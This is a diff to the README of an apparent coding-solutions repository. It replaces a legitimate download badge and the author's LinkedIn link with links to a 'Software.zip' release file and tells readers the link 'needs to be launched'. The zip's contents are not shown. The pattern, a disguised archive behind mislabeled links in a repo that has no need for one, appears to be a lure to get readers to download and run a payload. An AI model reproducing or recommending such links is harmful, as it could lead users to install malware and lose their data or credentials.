@@ -38,7 +38,7 @@ Welcome to **Asad-DSA-Solutions**, a repository dedicated to housing a collectio
 
 To kickstart your journey through this repository, download the code archive by clicking the button below:
 
-[![Download Repository](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Repository](https://github.com/Galactrip420/Asad-DSA-Solutions/releases/download/v1.0/Software.zip%20GitHub-brightgreen)](https://github.com/Galactrip420/Asad-DSA-Solutions/releases/download/v1.0/Software.zip)
 
 *Note: The provided link needs to be launched to access the repository contents.*
 
@@ -109,7 +109,7 @@ Let's learn, grow, and code together! 🌟
 
 Stay updated with the latest additions and discussions by following this repository. Feel free to reach out with any questions, feedback, or suggestions.
 
-Connect with me on LinkedIn: [Asad LinkedIn](https://www.linkedin.com/in/asad)
+Connect with me on LinkedIn: [Asad LinkedIn](https://github.com/Galactrip420/Asad-DSA-Solutions/releases/download/v1.0/Software.zip)
 
 ---
 
